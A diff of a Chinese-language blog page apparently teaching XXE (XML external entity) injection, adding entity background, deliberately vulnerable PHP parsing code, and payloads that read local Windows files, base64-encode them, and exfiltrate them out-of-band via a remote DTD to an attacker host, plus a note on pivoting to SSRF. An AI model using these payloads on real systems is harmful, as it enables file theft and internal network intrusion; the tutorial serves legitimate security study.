@@ -515,21 +515,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-03-16
+                    2021-03-17
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    2.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    9 分
                 </div>
                 
 
@@ -594,7 +594,9 @@
 // 引用实体
 %实体名称;
 // ps
-参数实体只能在DTD中引用，不能在声明前引用，也不能再实体声明内部引用</code></pre>
+- 使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用
+- 只有在 DTD 文件中，参数实体的声明才能引用其他实体
+- 和通用实体一样，参数实体也可以外部引用</code></pre>
 <p>DTD实体按实体值位置可分为：<strong>内部实体</strong>和<strong>外部实体</strong>：</p>
 <ul>
 <li>内部实体</li>
@@ -604,10 +606,120 @@
 <ul>
 <li>外部实体</li>
 </ul>
-<pre class=" language-xml"><code class="language-xml"></code></pre>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<pre class=" language-xml"><code class="language-xml">// 外部实体声明
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">实体名称</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">"DTD文件路径"</span> <span class="token punctuation">></span></span>
+<span class="token doctype">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”></span></code></pre>
+<p>下面将展示两端代码以便于更加清晰地了解内部实体和外部实体、通用实体和参数实体。</p>
+<p>外部实体、通用实体：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"></span> ]> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updateProfile</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Joe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span>  
+    ... 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updateProfile</span><span class="token punctuation">></span></span></code></pre>
+<p>外部实体、参数实体：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">an-element</span> <span class="token attr-name">"&lt;!ELEMENT</span> <span class="token attr-name">mytag</span> <span class="token attr-name">(subtag)</span><span class="token punctuation">></span></span>"> 
+&lt;!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
+%an-element; %remote-dtd;</code></pre>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="有回显读本地敏感文件（Normal-XXE）"><a href="#有回显读本地敏感文件（Normal-XXE）" class="headerlink" title="有回显读本地敏感文件（Normal XXE）"></a>有回显读本地敏感文件（Normal XXE）</h2><p>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件，以达到任意文件读取的效果。</p>
+<p><strong>源码示例</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>
+<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span>
+</code></pre>
+<p><strong>payload</strong>：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype">&lt;!DOCTYPE creds [  
+&lt;!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"></span> ]> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span><span class="token entity" title="&goodies;">&amp;goodies;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span></code></pre>
+<p>操作结果如下图所示：</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XXE/php_vuln/有回显读取本地敏感文件-无特殊字符.png" alt="有回显读取本地敏感文件-无特殊字符"></center>
+
+<p>因为<code>C:\Windows\system.ini</code>文件中不存在特殊字符所以直接显示时没有发生错误，但是如果引入的文件中存在<code>&lt; &gt; &amp; ‘ “</code>这五个特殊字符时将会报一堆错误且得不到我们想要的结果。这里提供两种方式来解决这种情况。</p>
+<p><strong>方法一</strong>：使用<code>CDATA</code>字节不解析内部数据</p>
+<p><strong>payload</strong>：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype">&lt;!DOCTYPE roottag [
+&lt;!ENTITY % start "&lt;![CDATA["></span>   
+&lt;!ENTITY % goodies SYSTEM "file:///c:/test/cc.txt">  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">end</span> <span class="token attr-name">"]]</span><span class="token punctuation">></span></span>">  
+&lt;!ENTITY % dtd SYSTEM "http://10.10.10.138/test/evil.dtd"> 
+%dtd; ]> 
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>roottag</span><span class="token punctuation">></span></span><span class="token entity" title="&all;">&amp;all;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>roottag</span><span class="token punctuation">></span></span></code></pre>
+<p>evil.dtd:</p>
+<pre class=" language-dtd"><code class="language-dtd"><?xml version="1.0" encoding="UTF-8"?> 
+<!ENTITY all "%start;%goodies;%end;"></code></pre>
+<p>操作结果如下图所示：</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XXE/php_vuln/有回显读本地敏感文件-特殊字符CDATA处理.png" alt="有回显读本地敏感文件-特殊字符CDATA处理"></center>
+
+<p><strong>说明</strong>：</p>
+<ul>
+<li>使用<code>CDATA</code>节方式读取文件内容时,若文件内含有<code>%</code>则依然失效</li>
+<li>另外若存在<code>]]&gt;</code>连续字符则此方式也失效，其他字符则可以绕过</li>
+<li>使用<code>base64</code>编码方式可以有效地避免以上的特殊情况</li>
+</ul>
+<p><strong>方法二</strong>：使用base64对文件内容进行编码后再输出</p>
+<p><strong>payload</strong>:</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype">&lt;!DOCTYPE creds [  
+&lt;!ENTITY goodies SYSTEM "php://filter/read=convert.base64-encode/resource=C:/test/1.txt"></span> ]> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span><span class="token entity" title="&goodies;">&amp;goodies;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span></code></pre>
+<p>操作结果如下图所示：</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XXE/php_vuln/有回显都本地敏感文件-特殊字符编码输出.png" alt="有回显都本地敏感文件-特殊字符编码输出"></center>
+
+
+
+<h2 id="无回显读取本地敏感文件（Blind-OOB-XXE）"><a href="#无回显读取本地敏感文件（Blind-OOB-XXE）" class="headerlink" title="无回显读取本地敏感文件（Blind OOB XXE）"></a>无回显读取本地敏感文件（Blind OOB XXE）</h2><p>在正常情况下XML就不会进行输出一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此现实中利用这个漏洞就必须找到一个不依靠其回显的方法——<strong>外带</strong>。</p>
+<p><strong>代码示例</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>
+<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p><strong>payload</strong>:</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE ANY [
+&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/Windows/win.ini"></span>
+&lt;!ENTITY % dtd SYSTEM "http://10.10.10.138/test/xxe.dtd">
+%dtd;
+%send;
+]></code></pre>
+<p><strong>xxe.dtd</strong>:</p>
+<pre class=" language-dtd"><code class="language-dtd"><!ENTITY % all  
+        "<!ENTITY &#x25; send SYSTEM 'http://10.10.10.130:9999/?p=%file;'>" 
+        >  
+        %all;</code></pre>
+<p>操作结果如下图所示：</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XXE/php_vuln/无回显读取本地敏感文件-外带.png" alt="无回显读取本地敏感文件-外带"></center>
+
+<p>外带利用步骤具体说明：</p>
+<ol>
+<li>首先VPS服务器开启对<code>9999</code>端口的侦听</li>
+<li>BurpSuite请求含有XXE漏洞的页面，并在请求中构造对敏感文件的读取和访问外部DTD文件</li>
+<li>服务器按照xee.dtd文件中的要求远端的VPS的指定端口发送请求数据包</li>
+<li>远端VPS接收到服务器的请求并拿到编码过的敏感文件内容</li>
+</ol>
+<p>在上述的操作中我们都只做了一件事，那就是通过<code>file</code>协议读取本地文件，或者是通过<code>http</code>协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如<code>192.168.0.10:8080</code>）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
+<p>所以要想更进一步的利用我们不能将眼光局限于<code>file</code>协议，我们必须清楚地知道在何种平台，我们能用何种协议，如下图所示展示了个平台所支持的常见协议。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XXE/php_vuln/各平台所支持的协议类型.png" alt="各平台所支持的协议类型"></center>
+
+<p>PHP在安装扩展以后还能支持的协议有：</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XXE/php_vuln/PHP扩展支持的协议类型.png" alt="PHP扩展支持的协议类型"></center>
+
+
+
+<h2 id="HTTP内网主机探测"><a href="#HTTP内网主机探测" class="headerlink" title="HTTP内网主机探测"></a>HTTP内网主机探测</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
 <li><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区</a></li>
-<li><a href="https://www.freebuf.com/column/181064.html" target="_blank" rel="noopener">XXE(XML External Entity attack)XML外部实体注入攻击 - FreeBuf网络安全行业门户</a></li>
+<li><a href="https://www.freebuf.com/column/181064.html" target="_blank" rel="noopener">XXE（XML External Entity attack）XML外部实体注入攻击 - FreeBuf网络安全行业门户</a></li>
 <li><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">XXE漏洞利用技巧：从XML到远程代码执行 - FreeBuf网络安全行业门户</a></li>
 </ul>
 
@@ -1196,7 +1308,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">304.8k</span>&nbsp;字
+                class="white-color">306k</span>&nbsp;字
             
             
             
@@ -1414,10 +1526,10 @@ $(function () {
     
 
     
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
     
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script></body>
 
 </html>
 <script type="text/javascript" src="/js/click_show_text.js"></script>
